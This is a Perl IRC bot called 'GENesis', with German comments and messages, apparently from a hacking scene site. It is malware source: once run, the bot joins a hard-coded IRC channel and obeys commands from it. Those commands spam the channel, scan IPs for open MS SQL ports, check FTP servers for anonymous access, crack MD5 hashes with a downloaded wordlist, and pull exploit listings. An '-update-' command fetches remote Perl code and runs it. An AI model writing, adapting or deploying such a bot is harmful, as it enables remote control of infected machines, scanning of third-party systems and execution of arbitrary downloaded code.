#!/usr/bin/perl
#############################
# Name: GENesis
# Beschreibung: IRC BOT
# Coder: Perforin
# Sites: dark-codez.org / perforins-software.de.vu
#
# Welcome to the dark side of coding!
##############################

use Socket;
use IO::Socket;
use IO::Socket::INET;
use LWP::UserAgent;
use LWP::Simple;
use Digest::MD5 qw(md5 md5_hex md5_base64);
use Net::Ping;
use Net::hostent;
use Net::FTP;

$BotnameKOMMA1 = rand(1001);
$BotnameGANZ1 = int($BotnameKOMMA1);

$Host = "irc.seilen.de";
$channel = "#dc";
$Port = 8067;
$version = "1.9";
$nick = "GENesis$BotnameGANZ1";
$email = "code 8 * :dark-codez.org";

print <<EOF;
              ___________________ _______                .__        
             /  _____/\\_   _____/ \\      \\   ____   _____|__| ______
            /   \\  ___ |    __)_  /   |   \\_/ __ \\ /  ___/  |/  ___/
            \\    \\_\\  \\|        \\/    |    \\  ___/ \\___ \\|  |\\___ \\ 
             \\______  /_______  /\\____|__  /\\___  >____  >__/____  >
                    \\/        \\/         \\/     \\/     \\/        \\/ 

Ich werde niemals vergessen,was ich in Dark-Codez gesehen habe.
Die Knochen von fuenftausend tapferen Männern lagen verstreut in den gewundenen Korridoren der Station.
Ihr Blut war an die Waende und auf den Boden der Schlafsaele geschmiert.
Ihre Innerein hingen von den Kontrollpanelen, wie die grotesken Dekorationen eines Festes des Wahnsinns.
Und doch wurde nicht ein einziger Schaedel gefunden!
Alle waren sie durch diese verachtenswerten Angreifer als Trophaeen entwendet worden.

GENesis Version $version coded by Perforin

Welcome to the dark side of coding!
EOF

@welcome = ("Ihr Blut war an die Wände und auf den Boden der Schlafsäle geschmiert.",
"Ihre Innerein hingen von den Kontrollpanelen,",
"wie die grotesken Dekorationen eines Festes des Wahnsinns!");
@alternate = ('bunny_funny',
              '7even',
              'scr3am');
@spam = ('The Dark side of Coding!',
         'Visit http://dark-codez.org',
         'Visit http://perforins-software.de.vu',
         'Bots rulen',
         'Perforin goes H4xxx',
         'Cant fuck me up dude :)',
         'GENesis Bot is here!');
@credits = ("Name: GENesis\n",
"Beschreibung: IRC BOT\n",
"Coder: Perforin",
"Sites: dark-codez.org / perforins-software.dl.am\n",
"Welcome to the dark side of coding!");
@help = ("-spam-      [Spamt im Channel]\n",
"-kill-      [Killt den Bot]\n",
"-credits-   [Zeigt euch die Credits]\n",
"-from-      [Zeigt die IP]\n",
"-version-   [Zeigt die Bot Version]\n",
"-mille-     [Zeigt die neusten Exploits]\n",
"-crack-     [Crackt einen MD5 Hash]\n",
"-md5gen-    [Erstellt euch einen MD5 Hash]\n",
"-ipgen-     [Generiert eine IP]",
"-ping-      [Pingt einen Server]",
"-pub-       [Versucht anonymous login]",
"-dns-       [Löst die DNS in eine IP auf]",
"-sql-       [Scannt eine IP nach MS SQL ab]\n",
"-update-    [Ziel URL mit Update]",
"-help-      [Zeigt die Hilfe an]");

my $sock = new IO::Socket::INET(
                                PeerAddr => $Host,
                                PeerPort => $Port,
                                Proto => 'tcp',
                               ) || die "No connection $!\n";

print $sock "NICK $nick\r\n";
print $sock "USER $email\r\n";

while ($input = <$sock>)
{
  if ($input =~ /004/){
    last;
  }
  elsif ($input =~ /433/){
                    $a = int(rand($#alternate));
                    $newnick = $alternate[$a+1];
                    print $sock "NICK $newnick\r\n";     
  }
 
}
print $sock "JOIN $channel\r\n";
for $zeile (@welcome) {
print $sock "PRIVMSG $channel :$zeile\r\n";
}
while ($input = <$sock>)
{
if ($input =~ /-help-/i){
for $help (@help) {
print $sock "PRIVMSG $channel :$help\r\n";
}
} elsif ($input =~ /-credits-/i) {
for $credit (@credits) {
print $sock "PRIVMSG $channel :$credit\r\n";
}
} elsif ($input =~ /-spam-/i){

        for ($i = 0; $i < 20; ++$i)
        {
        $r = int(rand($#spam));
        $message = $spam[$r+1];
        print $sock "PRIVMSG $channel :$message\r\n";
        }
       
    } elsif ($input =~ /-kill-/i) {
	print $sock "PRIVMSG $channel :Bye :)\r\n";
	close($sock);
	exit;
	} elsif ($input =~ /-from-/i) {
$getTHEip = 'http://www.wieistmeineip.de';
$agent = new LWP::UserAgent;
$request = HTTP::Request->new('GET',$getTHEip);
$result = $agent->request($request);
$getTHEip =~ s/.*\///;
$getTHEip = 'ip.txt';
open(lookME, ">$getTHEip");
print lookME $result->content();
close(lookME);
$need = "ip.txt";
open(IN,"<$need") || print "NOT FOUND BIATCH!"."\n";
@IN = <IN>;
close(IN);
@iplist = ();
unlink "ip.txt";
foreach $line(@IN){
 if($line =~ /(\d+\.\d+\.\d+\.\d+)/){
$message = $1;
 }
}
	print $sock "PRIVMSG $channel :I am from $message\r\n";
	
	} elsif ($input =~ /-version-/i) {
	print $sock "PRIVMSG $channel :GENesis Bot Version: $version\r\n";
	} elsif ($input =~ /-mille-/i) {
$getMILLE = 'http://milw0rm.com/rss.php';
$agent = new LWP::UserAgent;
$request = HTTP::Request->new('GET',$getMILLE);
$result = $agent->request($request);
$getit =~ s/.*\///;
@result = $result->content();
open(RES,">","mille.txt");
print RES @result;
close(RES);
open(RES,"<","mille.txt");
@inhalt = <RES>;
close(RES);
unlink ("mille.txt");
foreach $shit (@inhalt) {
$shit =~ tr/</ /;
$shit =~ tr/>/ /;
$shit =~ tr/\// /;
$shit =~ s/milw0rm.com//ig;
$shit =~ s/&lt;=/<=/ig;
if ($shit =~ m/title/i) {
$shit =~ s/title/ /ig;
push(@sploits,"$shit");
}
}
foreach $sploit (@sploits) {
print $sock "PRIVMSG $channel :$sploit\r\n";
}
	} elsif($input =~ /-SQL-/i) {
open(TMP,">","tmp.temp");
print TMP "$input";
close(TMP);
open(TMP,"<","tmp.temp");
@input = <TMP>;
close(TMP);
open(TMP,">","tmp.temp");
	for $ok (@input) {
	$ok =~ tr/ /\n/;
	print TMP "$ok";
	}
close(TMP);
open(TMP,"<","tmp.temp");
@input = <TMP>;
close(TMP);
unlink "tmp.temp";
foreach $ok (@input) {
	if ($ok =~ m/(\d\d\d?).(\d\d?\d?).(\d\d?\d?).(\d\d?\d?)/) {
	$ip = $ok;
	}
	}
	if ($check = new IO::Socket::INET (
PeerAddr => $ip,
PeerPort => "1433",
Proto => 'tcp',
Timeout => '1'))
{
$port = 1433;
print $sock "PRIVMSG $channel :OFFENER Port $port auf $ip\r\n";
} else {
print $sock "PRIVMSG $channel :Kein MS SQL auf $ip am laufen!\r\n";
}
	} elsif ($input =~ /-crack-/i) {
	$content=getstore('http://www.milw0rm.com/mil-dic.php','mil-dic.txt');
	open(TMP,">","tmp.temp");
print TMP "$input";
close(TMP);
open(TMP,"<","tmp.temp");
@input = <TMP>;
close(TMP);
open(TMP,">","tmp.temp");
	for $ok (@input) {
	$ok =~ tr/ /\n/;
	print TMP "$ok";
	}
close(TMP);
open(TMP,"<","tmp.temp");
@input = <TMP>;
close(TMP);
unlink "tmp.temp";
$hash = "@input[4]";
$hash =~ s/\r\n//;
open(MILLE,"<","mil-dic.txt");
@passes = <MILLE>;
close(MILLE);
foreach $string (@passes) {
chomp($string);
$md5 = Digest::MD5->new;
$md5->add("$string");
$digest = $md5->hexdigest;
if ($digest eq $hash) {
$md5FOUND = "DECRYPT: $string";
print $sock "PRIVMSG $channel :$md5FOUND\r\n";
}
}
print $sock "PRIVMSG $channel :Wordlist duchgecheckt!\r\n";
} elsif ($input =~ /-md5gen-/i) {
open(TMP,">","tmp.temp");
print TMP "$input";
close(TMP);
open(TMP,"<","tmp.temp");
@input = <TMP>;
close(TMP);
open(TMP,">","tmp.temp");
	for $gen (@input) {
	$gen =~ tr/ /\n/;
	print TMP "$gen";
	}
close(TMP);
open(TMP,"<","tmp.temp");
@input = <TMP>;
close(TMP);
unlink "tmp.temp";
$word = "@input[4]";
$word =~ s/\r\n//;
$md5 = Digest::MD5->new;
$md5->add("$word");
$digest = $md5->hexdigest;
$out = "$word => $digest";
print $sock "PRIVMSG $channel :$out\r\n";
} elsif ($input =~ /-update-/i) {
open(TMP,">","tmp.temp");
print TMP "$input";
close(TMP);
open(TMP,"<","tmp.temp");
@input = <TMP>;
close(TMP);
open(TMP,">","tmp.temp");
	for $ok (@input) {
	$ok =~ tr/ /\n/;
	print TMP "$ok";
	}
close(TMP);
open(TMP,"<","tmp.temp");
@input = <TMP>;
close(TMP);
unlink "tmp.temp";
foreach $chars (@input) {
	if ($chars =~ m/http:/) {
	$adresse = $chars;
	}
	}
if ($adresse != m/(perforin.coderz-heaven.de\/GENesis\/*)/gi) {
print $sock "PRIVMSG $channel :Nananana!\r\n";
} elsif ($adresse =~ m/(perforin.coderz-heaven.de\/GENesis\/*)/gi) {
my $content=get("$adresse");
my @CODE = $content;
$kommazahlXXX = rand(1001);
$ganzzahlXXX = int($kommazahlXXX);
open(IN,">GENesis$ganzzahlXXX.pl");
print IN @CODE; 
close(IN);
print $sock "PRIVMSG $channel :Update erfolgreich!\r\n";
system("GENesis$ganzzahlXXX.pl");
exit;
}
} elsif ($input =~ /-ipgen-/i) {
$kommazahl1 = rand(256);
$ganzzahl1 = int($kommazahl1);
if ($ganzzahl1 <= 128) {
do {
$ganzzahl1++;
} until($ganzzahl1 =~ 128);
}
$kommazahl2 = rand(256);
$ganzzahl2 = int($kommazahl2);
$kommazahl3 = rand(256);
$ganzzahl3 = int($kommazahl3);
$kommazahl4 = rand(256);
$ganzzahl4 = int($kommazahl4);
$GENIP = "$ganzzahl1".'.'."$ganzzahl2".'.'."$ganzzahl3".'.'."$ganzzahl4";
print $sock "PRIVMSG $channel :Generierte IP => $GENIP\r\n";
} elsif ($input =~ /-ping-/i) {
open(TMP,">","tmp.temp");
print TMP "$input";
close(TMP);
open(TMP,"<","tmp.temp");
@input = <TMP>;
close(TMP);
open(TMP,">","tmp.temp");
	for $ok (@input) {
	$ok =~ tr/ /\n/;
	print TMP "$ok";
	}
close(TMP);
open(TMP,"<","tmp.temp");
@input = <TMP>;
close(TMP);
unlink "tmp.temp";
$URL = "@input[4]";
$URL =~ s/\r\n//;
$ping = Net::Ping->new();
if ($ping->ping($URL)) {
print $sock "PRIVMSG $channel :ON => $URL\r\n"; 
} else {
print $sock "PRIVMSG $channel :OFF => $URL\r\n"; 
}
$ping->close();
} elsif ($input =~ /-DNS-/i) {
open(TMP,">","tmp.temp");
print TMP "$input";
close(TMP);
open(TMP,"<","tmp.temp");
@input = <TMP>;
close(TMP);
open(TMP,">","tmp.temp");
	for $char (@input) {
	$char =~ tr/ /\n/;
	print TMP "$char";
	}
close(TMP);
open(TMP,"<","tmp.temp");
@input = <TMP>;
close(TMP);
unlink "tmp.temp";
$URL = "@input[4]";
$URL =~ s/\r\n//;
if ($URL != m/(.*)/g) {
print $sock "PRIVMSG $channel :Das ist keine Domain du Spacken!\r\n";
} elsif ($URL =~ m/(.*)/g) {
$ip = inet_ntoa(gethost("$URL")->addr);
print $sock "PRIVMSG $channel :DNS aufgelöst in $ip\r\n";
}
} elsif ($input =~ m/^PING (.*?)$/gi) {
print $sock "PONG ".$1."\n";
} elsif ($input =~ /-PUB-/i) {
open(TMP,">","tmp.temp");
print TMP "$input";
close(TMP);
open(TMP,"<","tmp.temp");
@input = <TMP>;
close(TMP);
open(TMP,">","tmp.temp");
	for $given (@input) {
	$given =~ tr/ /\n/;
	print TMP "$given";
	}
close(TMP);
open(TMP,"<","tmp.temp");
@input = <TMP>;
close(TMP);
unlink "tmp.temp";
$location = "@input[4]";
$location =~ s/\r\n//;
$ftp = Net::FTP->new("$location", Debug => 0) || print $sock "PRIVMSG $channel :DOWN => $location\r\n";
if ($ftp->login("anonymous","welcome@hell.com")) { 
print $sock "PRIVMSG $channel :Pub! => $location \r\n";
$ftp->quit;
} else {
print $sock "PRIVMSG $channel :Kein Pub! => $location \r\n";
}
}
}